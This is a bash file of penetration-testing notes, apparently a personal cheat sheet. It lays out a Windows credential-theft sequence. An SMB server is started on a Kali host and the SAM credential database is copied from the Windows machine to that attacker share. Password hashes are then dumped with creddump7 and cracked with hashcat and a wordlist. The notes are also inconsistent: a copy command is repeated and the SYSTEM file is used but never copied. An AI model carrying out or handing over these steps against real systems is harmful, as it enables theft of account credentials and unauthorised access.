#!/bin/bash - 
#===============================================================================
#
#          FILE: windows.sh
# 
#         USAGE: ./windows.sh 
# 
#   DESCRIPTION: 
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Amit Agarwal (aka), 
#  ORGANIZATION: Individual
#       CREATED: 01/01/2021 13:44
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error
## Copy files with SMB
# Start smb server on kali
scr=$(locate examples|grep smbserver.py|grep -E "usr|opt")
python $scr -username ak -password ak -smb2support ak .

#On Windows
copy \Windows\Repair\SAM \\$LIP\ak\

## Hashdump with credump7
# On windows
net use \\$LIP /u:ak ak
copy \Windows\Repair\SAM \\$LIP\ak\
copy \Windows\Repair\SAM \\$LIP\ak\

python2 $PT_GDIR/tools/Windoes/creddump7/pwdump.py SYSTEM SAM
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
